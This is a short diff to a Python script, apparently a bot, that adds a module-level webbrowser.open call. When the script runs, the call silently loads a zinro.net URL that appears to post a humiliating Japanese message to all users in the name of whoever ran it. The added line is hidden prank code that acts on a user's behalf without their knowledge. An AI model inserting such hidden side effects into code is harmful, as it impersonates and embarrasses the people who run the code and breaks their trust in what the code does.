@@ -7,6 +7,8 @@ import time
 import ast
 import random
 
+webbrowser.open("https://zinro.net/m/player.php?mode=message&to_user=ALL&message=みあさんbotのコードを見せてくれてありがとうございます靴舐めます")
+
 
 newlua = []
 for yuik in range(1,500000,1):
